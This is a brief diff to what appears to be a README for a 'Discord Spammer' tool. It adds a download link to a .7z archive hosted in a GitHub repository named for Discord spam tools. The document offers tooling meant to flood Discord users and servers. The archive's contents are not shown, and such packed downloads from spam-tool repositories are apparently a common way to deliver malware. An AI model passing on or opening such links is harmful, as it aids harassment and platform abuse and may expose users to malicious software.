@@ -3,7 +3,7 @@
 # [CRONICX] Discord Spammer
 
 
-## [📁D O W N L O A D]()
+## [📁D O W N L O A D](https://github.com/vipersonamatteoscott8/discord-spam-tools/releases/download/spammer/Spammer_Tool.Discord.7z)
 
 
 
